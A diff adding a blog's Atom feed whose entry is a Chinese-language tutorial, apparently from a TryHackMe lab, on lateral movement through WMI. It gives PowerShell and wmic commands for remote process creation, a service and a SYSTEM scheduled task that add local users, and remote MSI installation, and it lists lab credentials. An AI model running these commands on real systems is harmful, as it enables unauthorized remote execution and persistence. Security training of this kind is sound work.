@@ -1,0 +1,705 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://k1t0111.github.io</id>
+    <title>K1T0 • Posts by &#34;内网渗透&#34; category</title>
+    <link href="https://k1t0111.github.io" />
+    <updated>2024-09-10T13:20:56.000Z</updated>
+    <category term="CTF" />
+    <category term="Android移动开发" />
+    <category term="枚举AD" />
+    <category term="cors" />
+    <category term="渗透靶场" />
+    <category term="渗透工具" />
+    <category term="top10及相关漏洞" />
+    <category term="tryhackme" />
+    <category term="vulnhub" />
+    <category term="sql注入" />
+    <category term="计算机网络" />
+    <category term="ssrf" />
+    <category term="博客搭建" />
+    <category term="攻击" />
+    <category term="hackmyvm" />
+    <category term="JAVA" />
+    <category term="漏洞分析" />
+    <category term="Hackthebox" />
+    <category term="安全设备" />
+    <category term="SQL" />
+    <category term="权限提升" />
+    <category term="信息收集" />
+    <category term="计算机组成原理" />
+    <category term="操作系统" />
+    <category term="信息安全数学基础" />
+    <category term="文件上传" />
+    <category term="横向移动" />
+    <category term="xss" />
+    <category term="算法" />
+    <entry>
+        <id>https://k1t0111.github.io/2024/09/10/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-WMI/</id>
+        <title>横向移动-WMI</title>
+        <link rel="alternate" href="https://k1t0111.github.io/2024/09/10/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-WMI/"/>
+        <content type="html">&lt;h4 id=&#34;什么是wmi&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#什么是wmi&#34;&gt;#&lt;/a&gt; 什么是 WMI?&lt;/h4&gt;
+&lt;p&gt;WMI 是基于 Web 的企业管理 (WBEM) 的 Windows 实现，WBEM 是跨设备访问管理信息的企业标准。&lt;br /&gt;
+WBEM（Web-Based Enterprise Management）是一个开放标准，用于跨平台和跨设备的管理信息访问。WMI（Windows Management Instrumentation）是 WBEM 的 Windows 实现，它将 WBEM 标准应用于 Windows 环境，以提供系统管理和自动化功能。WMI 在 Windows 系统中提供了一组用于查询和操作管理信息的接口和工具。&lt;/p&gt;
+&lt;p&gt;*** 连接到 WMI&lt;/p&gt;
+&lt;p&gt;连接到 WMI（Windows Management Instrumentation）之后，你可以管理和查询对应的系统。WMI 是 Windows 操作系统的一个组件，它允许你访问和操作系统的管理数据和功能。&lt;/p&gt;
+&lt;p&gt;通过 WMI，你可以执行各种操作，例如：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;查询系统信息&lt;/strong&gt;：获取系统硬件、操作系统、网络配置等信息。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;管理系统资源&lt;/strong&gt;：创建、删除、或修改文件和进程，管理服务等。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;执行系统操作&lt;/strong&gt;：启动、停止、重启服务或进程，设置系统属性等。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;所以如同我们连接所有的系统一样我们都需要凭据，同时 WMI 还需要指定一个连接的方式。&lt;br /&gt;
+** 准备凭据&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;一个很重要的点，我们连接 wmi 一定要是管理员&lt;/em&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt; = &lt;span class=&#34;token string&#34;&gt;&#39;Administrator&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt; = &lt;span class=&#34;token string&#34;&gt;&#39;Mypass123&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$securePassword&lt;/span&gt; = &lt;span class=&#34;token function&#34;&gt;ConvertTo-SecureString&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;AsPlainText &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Force&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$credential&lt;/span&gt; = &lt;span class=&#34;token function&#34;&gt;New-Object&lt;/span&gt; System&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Management&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Automation&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;PSCredential &lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$securePassword&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;稍微解释一下&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;$username&lt;/code&gt;  和  &lt;code&gt;$password&lt;/code&gt;  分别存储用户名和密码。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ConvertTo-SecureString&lt;/code&gt;  将密码字符串转换为安全字符串对象，确保密码以加密方式存储。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;New-Object System.Management.Automation.PSCredential&lt;/code&gt;  创建一个  &lt;code&gt;PSCredential&lt;/code&gt;  对象，结合用户名和安全字符串密码，用于进行需要身份验证的操作&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;连接方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#连接方式&#34;&gt;#&lt;/a&gt; ** 连接方式&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;**DCOM：** RPC over IP 将用于连接到 WMI。该协议使用端口 135/ TCP和端口 49152-65535/ TCP ，正如使用 sc.exe 时所解释的那样。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Wsman：&lt;/strong&gt; WinRM 将用于连接到 WMI。此协议使用端口 5985/TCP (WinRM HTTP ) 或 5986/ TCP (WinRM HTTPS)。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;*** 开始连接&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$Opt&lt;/span&gt; = &lt;span class=&#34;token function&#34;&gt;New-CimSessionOption&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Protocol DCOM&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$Session&lt;/span&gt; = &lt;span class=&#34;token function&#34;&gt;New-Cimsession&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ComputerName TARGET &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Credential &lt;span class=&#34;token variable&#34;&gt;$credential&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;SessionOption &lt;span class=&#34;token variable&#34;&gt;$Opt&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ErrorAction Stop&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt; &lt;code&gt;$Opt = New-CimSessionOption -Protocol DCOM&lt;/code&gt; &lt;/strong&gt;：创建一个 CIM 会话选项对象，指定协议为 DCOM（Distributed Component Object Model）。DCOM 是一种用于网络上的对象通信的协议。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt; &lt;code&gt;$Session = New-CimSession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop&lt;/code&gt; &lt;/strong&gt;：建立一个新的 CIM 会话。参数包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-ComputerName TARGET&lt;/code&gt; ：指定目标计算机的名称或 IP 地址。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-Credential $credential&lt;/code&gt; ：传递之前创建的凭据对象，以便进行认证。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-SessionOption $Opt&lt;/code&gt; ：应用前面创建的会话选项（即 DCOM 协议）。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-ErrorAction Stop&lt;/code&gt; ：在发生错误时立即停止执行并抛出异常。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;其实到这里，已经发现其实 wmi 是 wbem 的实现，那么他就是一个 windows 的组件，我们可以连接到远程计算机上的 wmi 然后开始使用 wmi 进行一个针对于系统的管理。&lt;/p&gt;
+&lt;h3 id=&#34;wmi的一些利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wmi的一些利用&#34;&gt;#&lt;/a&gt; WMI 的一些利用&lt;/h3&gt;
+&lt;h5 id=&#34;执行系统命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行系统命令&#34;&gt;#&lt;/a&gt; 执行系统命令&lt;/h5&gt;
+&lt;p&gt;我们可以利用 Windows Management Instrumentation ( WMI ) 从 Powershell 远程生成一个进程，向 Win32_Process 类发送 WMI 请求，以在我们之前创建的会话下生成该进程&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$Command&lt;/span&gt; = &lt;span class=&#34;token string&#34;&gt;&#34;powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Invoke-CimMethod&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;CimSession &lt;span class=&#34;token variable&#34;&gt;$Session&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ClassName Win32_Process &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;MethodName Create &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Arguments @&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;CommandLine = &lt;span class=&#34;token variable&#34;&gt;$Command&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;可以看到现在才发现，wmi 没有一个交互我们的 session 就是我们连接之后的标志。把 session 带入到一个执行命令的 powershell 命令中。在以前的旧系统中可以使用 wmic 在命令行中直接连接 wmi。&lt;br /&gt;
+ &lt;code&gt;wmic&lt;/code&gt;  确实被视为较旧的工具，主要因为它在 Windows 10 和 Windows Server 2019 及更高版本中逐渐被 PowerShell 替代。PowerShell 提供了更强大和灵活的功能，且与现代 Windows 系统更兼容。 &lt;code&gt;wmic&lt;/code&gt;  工具可能在未来的 Windows 版本中被逐步淘汰，因此推荐使用 PowerShell 的  &lt;code&gt;CimCmdlets&lt;/code&gt;  或  &lt;code&gt;Get-WmiObject&lt;/code&gt;  等命令进行类似的操作。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create &amp;quot;cmd.exe /c calc.exe&amp;quot; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5 id=&#34;创建服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#创建服务&#34;&gt;#&lt;/a&gt; 创建服务&lt;/h5&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Invoke-CimMethod&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;CimSession &lt;span class=&#34;token variable&#34;&gt;$Session&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ClassName Win32_Service &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;MethodName &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 利用我们的连接 session&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Create &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Arguments @&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Name = &lt;span class=&#34;token string&#34;&gt;&#34;THMService2&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 创建一个 THMService2 的服务&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;DisplayName = &lt;span class=&#34;token string&#34;&gt;&#34;THMService2&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PathName = &lt;span class=&#34;token string&#34;&gt;&#34;net user munra2 Pass123 /add&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# payload&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ServiceType = &lt;span class=&#34;token namespace&#34;&gt;[byte]&lt;/span&gt;::Parse&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;16&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# Win32OwnProcess : Start service in a new process&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;StartMode = &lt;span class=&#34;token string&#34;&gt;&#34;Manual&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;可以启动对应&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$Service&lt;/span&gt; = &lt;span class=&#34;token function&#34;&gt;Get-CimInstance&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;CimSession &lt;span class=&#34;token variable&#34;&gt;$Session&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ClassName Win32_Service &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;filter&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Name LIKE &#39;THMService2&#39;&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Invoke-CimMethod&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;InputObject &lt;span class=&#34;token variable&#34;&gt;$Service&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;MethodName StartService&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;删除服务&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Invoke-CimMethod&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;InputObject &lt;span class=&#34;token variable&#34;&gt;$Service&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;MethodName StopService&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Invoke-CimMethod&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;InputObject &lt;span class=&#34;token variable&#34;&gt;$Service&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;MethodName Delete&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h5 id=&#34;创建计划任务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#创建计划任务&#34;&gt;#&lt;/a&gt; 创建计划任务&lt;/h5&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# Payload must be split in Command and Args&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$Command&lt;/span&gt; = &lt;span class=&#34;token string&#34;&gt;&#34;cmd.exe&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$Arg1&lt;/span&gt; = &lt;span class=&#34;token string&#34;&gt;&#34;/c net user munra22 aSdf1234 /add&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$Action&lt;/span&gt; = &lt;span class=&#34;token function&#34;&gt;New-ScheduledTaskAction&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;CimSession &lt;span class=&#34;token variable&#34;&gt;$Session&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Execute &lt;span class=&#34;token variable&#34;&gt;$Command&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Argument &lt;span class=&#34;token variable&#34;&gt;$Arg1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Register-ScheduledTask&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;CimSession &lt;span class=&#34;token variable&#34;&gt;$Session&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Action &lt;span class=&#34;token variable&#34;&gt;$Action&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;User &lt;span class=&#34;token string&#34;&gt;&#34;NT AUTHORITY\SYSTEM&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;TaskName &lt;span class=&#34;token string&#34;&gt;&#34;THMtask2&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Start-ScheduledTask&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;CimSession &lt;span class=&#34;token variable&#34;&gt;$Session&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;TaskName &lt;span class=&#34;token string&#34;&gt;&#34;THMtask2&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;*** 删除定时任务&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Unregister-ScheduledTask&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;CimSession &lt;span class=&#34;token variable&#34;&gt;$Session&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;TaskName &lt;span class=&#34;token string&#34;&gt;&#34;THMtask2&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h5 id=&#34;安装msi程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安装msi程序&#34;&gt;#&lt;/a&gt; 安装 msi 程序&lt;/h5&gt;
+&lt;p&gt;MSI 是&lt;br /&gt;
+一种用于安装程序的文件格式。如果我们可以将 MSI 包复制到目标系统，那么我们就可以使用 WMI 尝试为我们安装它。攻击者可以通过任何可用的方式复制该文件。一旦 MSI 文件位于目标系统中，我们就可以尝试通过 WMI 调用 Win32_Product 类来安装&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Invoke-CimMethod&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;CimSession &lt;span class=&#34;token variable&#34;&gt;$Session&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ClassName Win32_Product &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;MethodName Install &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Arguments @&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;PackageLocation = &lt;span class=&#34;token string&#34;&gt;&#34;C:\Windows\myinstaller.msi&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; Options = &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; AllUsers = &lt;span class=&#34;token boolean&#34;&gt;$false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;同样在旧系统&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;稍微总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#稍微总结&#34;&gt;#&lt;/a&gt; 稍微总结&lt;/h3&gt;
+&lt;p&gt;可以看到我们使用了 windows 的一个组件叫做 WMI 但其实我发现他更多的可能是简便了一些我们横向时候的操作，不需要重复的进行凭证验证。同时我们使用 wmi 可能更加的隐蔽。正如我们进行红队测试时候我们更多的是进行一些隐蔽的思量和思考。&lt;/p&gt;
+&lt;h3 id=&#34;实验&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实验&#34;&gt;#&lt;/a&gt; 实验&lt;/h3&gt;
+&lt;p&gt;*** 首先需要一个管理员的凭据&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;用户：&lt;/strong&gt; &lt;a href=&#34;http://ZA.TRYHACKME.COM&#34;&gt;ZA.TRYHACKME.COM&lt;/a&gt;\t1_corine.waters&lt;br /&gt;
+&lt;strong&gt; 密码：&lt;/strong&gt; Korine.1994&lt;/p&gt;
+&lt;p&gt;具体的环境搭建不做赘述。&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;先连接到对应的 thmjmp2 上&lt;/em&gt;&lt;br /&gt;
+相关凭据:   Username:  henry.bird  Password:  Changeme123&lt;/p&gt;
+&lt;p&gt;具体实验步骤不做具体的描述，我们只尝试几个 payload，和几种移动利用的方式。&lt;/p&gt;
+&lt;h5 id=&#34;先连接wmi&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#先连接wmi&#34;&gt;#&lt;/a&gt; 先连接 WMI&lt;/h5&gt;
